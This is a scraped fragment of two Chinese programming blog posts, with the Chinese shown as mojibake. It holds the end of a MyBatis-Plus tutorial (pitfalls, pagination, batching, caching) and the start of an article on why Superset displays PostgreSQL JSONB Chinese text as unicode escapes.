<span class="hljs-comment">// 3. å­˜åœ¨åˆ™æ›´æ–°ï¼Œä¸å­˜åœ¨åˆ™æ’å…¥</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveOrUpdateOrder</span><span class="hljs-params">(Order order)</span> {
    <span class="hljs-comment">// è‡ªåŠ¨åˆ¤æ–­ï¼šæœ‰idåˆ™æ›´æ–°ï¼Œæ— idåˆ™æ’å…¥</span>
    orderMapper.insertOrUpdate(order);
}
</code></pre>
<h3 data-id="heading-22">å…­ã€é¿å‘æŒ‡å—</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-23">å‘1ï¼šå­—æ®µåä¸å¯¹åº”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ•°æ®åº“æ˜¯user_nameï¼Œå®ä½“æ˜¯userNameï¼Œä½†æ²¡é…ç½®æ˜ å°„</span>
<span class="hljs-keyword">private</span> String userName;

<span class="hljs-comment">// âœ… æ­£ç¡®1ï¼šä½¿ç”¨@TableFieldæŒ‡å®š</span>
<span class="hljs-meta">@TableField("user_name")</span>
<span class="hljs-keyword">private</span> String userName;

<span class="hljs-comment">// âœ… æ­£ç¡®2ï¼šé…ç½®å…¨å±€ä¸‹åˆ’çº¿è½¬é©¼å³°</span>
mybatis-plus:
  configuration:
    map-underscore-to-camel-<span class="hljs-keyword">case</span>: <span class="hljs-literal">true</span>
</code></pre>
<h4 data-id="heading-24">å‘2ï¼šåˆ†é¡µå¤±æ•ˆ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ²¡é…ç½®åˆ†é¡µæ’ä»¶</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getUsers</span><span class="hljs-params">()</span> {
    Page&lt;User&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
    <span class="hljs-keyword">return</span> userMapper.selectPage(page, <span class="hljs-literal">null</span>);  <span class="hljs-comment">// ä¸ä¼šåˆ†é¡µï¼</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šé…ç½®åˆ†é¡µæ’ä»¶</span>
<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
    <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
    interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>());
    <span class="hljs-keyword">return</span> interceptor;
}
</code></pre>
<h4 data-id="heading-25">å‘3ï¼šé€»è¾‘åˆ é™¤å­—æ®µç±»å‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šç”¨Stringç±»å‹ï¼Œä½†é…ç½®çš„æ˜¯Integer</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> String deleted;  <span class="hljs-comment">// é…ç½®æ˜¯1/0ï¼Œè¿™é‡Œæ˜¯String</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šç±»å‹åŒ¹é…</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> Integer deleted;  <span class="hljs-comment">// ç”¨Integer</span>
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> Boolean deleted;  <span class="hljs-comment">// ç”¨Booleanï¼Œé…ç½®true/false</span>
</code></pre>
<h3 data-id="heading-26">ä¸ƒã€æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-27">7.1 æŸ¥è¯¢ä¼˜åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åªæŸ¥è¯¢éœ€è¦çš„å­—æ®µ</span>
LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
wrapper.select(User::getId, User::getName, User::getAge)  <span class="hljs-comment">// åªæŸ¥3ä¸ªå­—æ®µ</span>
       .eq(User::getStatus, <span class="hljs-number">1</span>);
</code></pre>
<h4 data-id="heading-28">7.2 æ‰¹é‡æ“ä½œ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰¹é‡æ’å…¥ï¼ˆæ€§èƒ½æå‡10å€ï¼‰</span>
List&lt;User&gt; userList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-comment">// ...æ·»åŠ æ•°æ®</span>
userMapper.insertBatchSomeColumn(userList);  <span class="hljs-comment">// æ‰¹é‡æ’å…¥æ–¹æ³•</span>

<span class="hljs-comment">// æ‰¹é‡æ›´æ–°</span>
List&lt;Long&gt; ids = Arrays.asList(<span class="hljs-number">1L</span>, <span class="hljs-number">2L</span>, <span class="hljs-number">3L</span>);
UpdateWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateWrapper</span>&lt;&gt;();
wrapper.in(<span class="hljs-string">"id"</span>, ids)
       .set(<span class="hljs-string">"status"</span>, <span class="hljs-number">2</span>);
userMapper.update(<span class="hljs-literal">null</span>, wrapper);
</code></pre>
<h4 data-id="heading-29">7.3 ç¼“å­˜ä½¿ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(value = "user", key = "#id")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-keyword">return</span> userMapper.selectById(id);
}

<span class="hljs-meta">@CacheEvict(value = "user", key = "#user.id")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(User user)</span> {
    userMapper.updateById(user);
}
</code></pre>
<h3 data-id="heading-30">å…«ã€ä»Šæ—¥è¦ç‚¹æ€»ç»“</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<ol>
<li><strong>ä»£ç ç”Ÿæˆå™¨</strong>ï¼šæ–°é¡¹ç›®ã€æ–°è¡¨ä¸€é”®ç”Ÿæˆæ‰€æœ‰ä»£ç </li>
<li><strong>æ¡ä»¶æ„é€ å™¨</strong>ï¼šå‘Šåˆ«XMLï¼Œé“¾å¼è°ƒç”¨æ›´æ¸…æ™°</li>
<li><strong>åˆ†é¡µæ’ä»¶</strong>ï¼šä¸€è¡Œä»£ç æå®šåˆ†é¡µæŸ¥è¯¢</li>
<li><strong>è‡ªåŠ¨å¡«å……</strong>ï¼šåˆ›å»ºæ—¶é—´ã€æ›´æ–°æ—¶é—´è‡ªåŠ¨ç»´æŠ¤</li>
<li><strong>é€»è¾‘åˆ é™¤</strong>ï¼šæ•°æ®ä¸çœŸåˆ ï¼Œä¾¿äºæ¢å¤å’Œå®¡è®¡</li>
<li><strong>é«˜çº§åŠŸèƒ½</strong>ï¼šå¤šç§Ÿæˆ·ã€ä¹è§‚é”ã€æšä¸¾å¤„ç†</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå­—æ®µé€‰æ‹©ã€æ‰¹é‡æ“ä½œã€ç¼“å­˜</li>
</ol>
<p><strong>å¯¹æ¯”ä¸€ä¸‹</strong>ï¼š</p>









































<table><thead><tr><th>åŠŸèƒ½</th><th>ä¼ ç»ŸMyBatis</th><th>MyBatis-Plus</th><th>æ•ˆç‡æå‡</th></tr></thead><tbody><tr><td>åŸºç¡€CRUD</td><td>å†™XMLï¼Œ4ä¸ªæ–¹æ³•</td><td>ç»§æ‰¿BaseMapperï¼Œ0è¡Œä»£ç </td><td>âˆ</td></tr><tr><td>æ¡ä»¶æŸ¥è¯¢</td><td>XMLé‡Œå†™ifæ ‡ç­¾</td><td>é“¾å¼è°ƒç”¨</td><td>3å€</td></tr><tr><td>åˆ†é¡µæŸ¥è¯¢</td><td>å†™2ä¸ªSQLï¼Œæ‰‹åŠ¨è®¡ç®—</td><td>selectPageä¸€è¡Œä»£ç </td><td>5å€</td></tr><tr><td>é€»è¾‘åˆ é™¤</td><td>æ¯ä¸ªæŸ¥è¯¢åŠ whereæ¡ä»¶</td><td>@TableLogicè‡ªåŠ¨è¿‡æ»¤</td><td>10å€</td></tr><tr><td>å­—æ®µå¡«å……</td><td>æ¯ä¸ªæ–¹æ³•é‡Œset</td><td>è‡ªåŠ¨å¡«å……å¤„ç†å™¨</td><td>8å€</td></tr></tbody></table>
<h3 data-id="heading-31">ä¹ã€æ€è€ƒé¢˜</h3>
<p><strong>åœºæ™¯</strong>ï¼šä½ è¦å¼€å‘ä¸€ä¸ªç”µå•†åå°ç®¡ç†ç³»ç»Ÿï¼Œæœ‰50å¼ è¡¨</p>
<ol>
<li>å¦‚ä½•å¿«é€Ÿå¼€å§‹å¼€å‘ï¼Ÿ</li>
<li>å¦‚ä½•å®ç°ç»Ÿä¸€çš„æ•°æ®æƒé™ï¼ˆä¸åŒäººçœ‹ä¸åŒæ•°æ®ï¼‰ï¼Ÿ</li>
<li>å¦‚ä½•ä¼˜åŒ–å¤§æ‰¹é‡æ•°æ®å¯¼å‡ºçš„æ€§èƒ½ï¼Ÿ</li>
<li>å¦‚ä½•å®ç°æ“ä½œæ—¥å¿—è‡ªåŠ¨è®°å½•ï¼Ÿ</li>
</ol>
<p>è¯„è®ºåŒºèŠèŠä½ çš„æ–¹æ¡ˆï¼Œæ˜å„¿å’±ä»¬è®²WebSocketã€‚</p>
<hr/>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<p><strong>æ˜å¤©é¢„å‘Š</strong>ï¼šã€ŠSpringBoot+WebSocketï¼šåœ¨çº¿èŠå¤©å®¤ä»0åˆ°1ã€‹</p>
<p><strong>ä»Šæ—¥ç¦åˆ©</strong>ï¼šå…³æ³¨åå›å¤"MPä»£ç ç”Ÿæˆ"ï¼Œè·å–å®Œæ•´ä»£ç ç”Ÿæˆå™¨é…ç½®å’Œæ¨¡æ¿æ–‡ä»¶ã€‚</p>
<hr/>
<h2 data-id="heading-32">è¿è¥å°è´´å£«ï¼š</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<p>ğŸ’¡ <strong>äº’åŠ¨</strong>ï¼š</p>
<ol>
<li>ä½ ç°åœ¨ç”¨çš„æ˜¯ä»€ä¹ˆORMæ¡†æ¶ï¼Ÿæœ‰ä»€ä¹ˆç—›ç‚¹ï¼Ÿ</li>
<li>æŠ•ç¥¨ï¼šä½ ä¼šå°è¯•MyBatis-Pluså—ï¼Ÿ</li>
<li>ç•™è¨€åˆ†äº«ä½ çš„æ•ˆç‡æå‡æŠ€å·§</li>
</ol>
<p>ğŸ¯ <strong>è½¬å‘è¯æœ¯</strong>ï¼š
"å°‘å†™80%çš„ä»£ç ï¼MyBatis-Plusè®©CRUDå¼€å‘å¿«åˆ°é£èµ·ï¼"</p>
<p>ğŸ <strong>ç¦åˆ©</strong>ï¼š</p>
<ol>
<li>ç•™è¨€åŒºæŠ½3äººé€ã€ŠMyBatis-Pluså®æˆ˜æ•™ç¨‹ã€‹</li>
<li>è½¬å‘æˆªå›¾é€ä¼ä¸šçº§ä»£ç ç”Ÿæˆå™¨æ¨¡æ¿</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Superset å±•ç¤º JSONB ä¸­æ–‡å˜å¤©ä¹¦ï¼ŸçœŸç›¸ç«Ÿç„¶æ˜¯ Python çš„â€œè¿‡åº¦ä¿æŠ¤â€]]></title>    <link>https://juejin.cn/post/7589155289191989275</link>    <guid>https://juejin.cn/post/7589155289191989275</guid>    <pubDate>2025-12-30T02:35:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589155289191989275" data-draft-id="7589194558287429670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Superset å±•ç¤º JSONB ä¸­æ–‡å˜å¤©ä¹¦ï¼ŸçœŸç›¸ç«Ÿç„¶æ˜¯ Python   çš„â€œè¿‡åº¦ä¿æŠ¤â€"/> <meta itemprop="keywords" content="åç«¯,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2025-12-30T02:35:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Superset å±•ç¤º JSONB ä¸­æ–‡å˜å¤©ä¹¦ï¼ŸçœŸç›¸ç«Ÿç„¶æ˜¯ Python   çš„â€œè¿‡åº¦ä¿æŠ¤â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:35:16.000Z" title="Tue Dec 30 2025 02:35:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Superset é‡Œç»™è¿è¥åŒå­¦æ­çœ‹æ¿ï¼Œæƒ³å±•ç¤ºä¸€ä¸‹ç”¨æˆ·çš„å¯¹è¯æ—¥å¿—ã€‚æ•°æ®ä» PostgreSQL è§†å›¾é‡Œä¸€æŸ¥ï¼ŒDBeaver é‡Œçœ‹ç€ä¸€åˆ‡æ­£å¸¸ã€‚</p>
<p>ç»“æœä¸€æ”¾åˆ° Superset å›¾è¡¨ä¸Šï¼Œå‚»çœ¼äº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afc2f6971ecb450e9c845183a55b1faa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lmf5peg6aOO6Zuo5Lmf6Zu-5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666915&amp;x-signature=55q%2Bv1Iof3dF%2F1V8sMCMpPrw9rk%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"\u4eca\u5929\u5929\u6c14"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
</code></pre>
<p>å¥½å¥½çš„ä¸­æ–‡å…¨å˜æˆäº† <code>\uXXXX</code> è¿™ç§å¤©ä¹¦ã€‚</p>
<h2 data-id="heading-0">æ¡ˆå‘ç°åœº</h2>
<p>èƒŒæ™¯æ˜¯è¿™æ ·çš„ï¼šæˆ‘ç”¨ PostgreSQL çš„ FDW åšè·¨åº“æŸ¥è¯¢ï¼Œä¸“é—¨å†™äº†ä¸ªè§†å›¾ <code>v_conversation_summary</code> æŠ•å–‚ç»™ Supersetã€‚ä¸ºäº†æŠŠå¤šè½®å¯¹è¯èšåˆåœ¨ä¸€è¡Œæ˜¾ç¤ºï¼Œæˆ‘ç”¨äº† <code>jsonb_agg</code>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åŸå§‹ SQL ç‰‡æ®µ</span>
<span class="hljs-keyword">SELECT</span> jsonb_agg(
    jsonb_build_object(<span class="hljs-string">'role'</span>, tm.role, <span class="hljs-string">'content'</span>, tm.content)
    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> tm.message_order
) <span class="hljs-keyword">AS</span> å¯¹è¯è®°å½•
...
</code></pre>
<p>é€»è¾‘æ²¡æ¯›ç—…ï¼Œæ•°æ®åº“é‡ŒæŸ¥å‡ºæ¥çš„ç»“æœä¹Ÿæ˜¯æ ‡å‡†çš„ JSON æ•°ç»„ã€‚æ€ä¹ˆåˆ°äº† Superset å‰ç«¯å°±"ä¹±ç "äº†å‘¢ï¼Ÿ</p>
<h3 data-id="heading-1">æ’æ’­ï¼šä¸ºä»€ä¹ˆä¸€å¼€å§‹è¦ç”¨ JSONBï¼Ÿ</h3>
<p>è¿™é‡Œç¨å¾®è§£é‡Šä¸‹ï¼Œä¸ºä»€ä¹ˆæˆ‘ä¹ æƒ¯æ€§åœ°é€‰äº† <code>JSONB</code> è€Œä¸æ˜¯æ™®é€šçš„æ–‡æœ¬æ‹¼æ¥ã€‚</p>
<p>PostgreSQL çš„ <code>JSONB</code> (Binary JSON) æ˜¯ä¸ªéå¸¸å¼ºå¤§çš„ç‰¹æ€§ã€‚ä¸åŒäºæ™®é€šçš„ <code>JSON</code> ç±»å‹ï¼ˆçº¯æ–‡æœ¬å­˜å‚¨ï¼‰ï¼Œ<code>JSONB</code> åœ¨å­˜å‚¨æ—¶ä¼šæŠŠæ•°æ®<strong>è§£æå¹¶è½¬æ¢æˆäºŒè¿›åˆ¶æ ¼å¼</strong>ã€‚</p>
<ul>
<li><strong>å­˜çš„æ—¶å€™</strong>ï¼šå®ƒä¼šæŠŠé”®å€¼å¯¹æ’åºã€å»é‡ã€å‹ç¼©ã€‚</li>
<li><strong>å–çš„æ—¶å€™</strong>ï¼šä¸éœ€è¦å†æ¬¡è§£ææ–‡æœ¬ï¼Œç›´æ¥å°±èƒ½æ‹¿æ¥ç”¨ï¼Œæ€§èƒ½æé«˜ã€‚</li>
<li><strong>æœ€é‡è¦çš„æ˜¯</strong>ï¼šå®ƒæ”¯æŒ <strong>GIN ç´¢å¼•</strong>ã€‚å¦‚æœä½ æƒ³åœ¨å‡ ç™¾ä¸‡æ¡æ•°æ®é‡Œæœ <code>{"role": "user"}</code>ï¼Œç”¨ JSONB æ˜¯æ¯«ç§’çº§çš„ï¼Œç”¨æ–‡æœ¬å­˜å°±æ˜¯å…¨è¡¨æ‰«æã€‚</li>
</ul>
<p>å› ä¸ºä¹ æƒ¯äº†å®ƒçš„é«˜æ€§èƒ½å’Œè§„èŒƒæ€§ï¼Œæˆ‘ä¸‹æ„è¯†åœ°å°±ç”¨äº† <code>jsonb_agg</code>ã€‚æ²¡æƒ³åˆ°ï¼Œæ­£æ˜¯è¿™ä¸ª"äºŒè¿›åˆ¶"çš„ç‰¹æ€§ï¼Œé…åˆä¸Š Python çš„ä¸¥è°¨ï¼Œæå‡ºäº†è¿™æ¬¡çš„ä¹±ç ä¹Œé¾™ã€‚</p>
<h2 data-id="heading-2">ç ´æ¡ˆè¿‡ç¨‹</h2>
